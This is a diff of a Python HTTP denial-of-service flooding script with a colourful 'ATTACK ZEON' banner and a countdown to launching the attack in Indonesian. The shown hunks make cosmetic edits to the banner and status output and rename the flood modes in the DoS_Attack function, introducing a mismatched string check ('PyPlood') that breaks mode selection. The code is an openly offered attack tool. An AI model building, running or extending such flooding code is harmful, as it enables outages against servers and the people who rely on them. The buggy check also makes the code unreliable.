@@ -22,8 +22,8 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW} [ H A Q ]{Fore.LIGHTYELLOW_EX} Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.RESET}")
-    print(f"{Fore.GREEN} [ H A Q ]{Fore.LIGHTBLUE_EX} Attack{Fore.WHITE} {path_get} {Fore.CYAN} Scrape{Fore.BLUE}{rps} {Fore.LIGHTCYAN_EX} ID{Fore.RED}{thread_id}{Fore.RESET}")
+    print(f"{Fore.YELLOW} [ H A Q ]{Fore.LIGHTYELLOW_EX}  Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.RESET}")
+    print(f"{Fore.GREEN} [ H A Q ]{Fore.LIGHTBLUE_EX}  Attack{Fore.WHITE} {path_get} {Fore.CYAN} Scrape{Fore.BLUE}{rps} {Fore.LIGHTCYAN_EX} ID{Fore.RED}{thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -40,9 +40,9 @@ def generate_url_path_choice(num):
 def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
     rps = 0
     url_path = ''
-    path_get = ['PY_FLOOD','CHOICES_FLOOD']
+    path_get = ['PyFlood','Chois_Flood']
     path_get_loader = random.choice((path_get))
-    if path_get_loader == "PY_FLOOD":
+    if path_get_loader == "PyPlood":
         url_path = generate_url_path_pyflooder(5)
     else:
         url_path = generate_url_path_choice(5)
@@ -98,7 +98,7 @@ banner = f"""
 {Fore.YELLOW}║{Fore.WHITE}                  H U D A I R U L  A L - A Q S H A             {Fore.YELLOW}║
 {Fore.YELLOW}║{Fore.GREEN}                           INTERNAL SCRIPT                     {Fore.YELLOW}║
 {Fore.YELLOW}║{Fore.BLUE}                              ATTACK ZEON                      {Fore.YELLOW}║
-{Fore.YELLOW}║{Fore.WHITE}                               By:Kf'24                      {Fore.YELLOW}║
+{Fore.YELLOW}║{Fore.WHITE}                               By:Kf'24                        {Fore.YELLOW}║
 {Fore.YELLOW}║{Fore.LIGHTYELLOW_EX}                               ——oO0Oo—                        {Fore.YELLOW}║
 {Fore.YELLOW}╚═══════════════════════════════════════════════════════════════╝
 ===>> 35 DETIK UNTUK MEMULAI SERANGAN...!! <==={Fore.RESET}"""
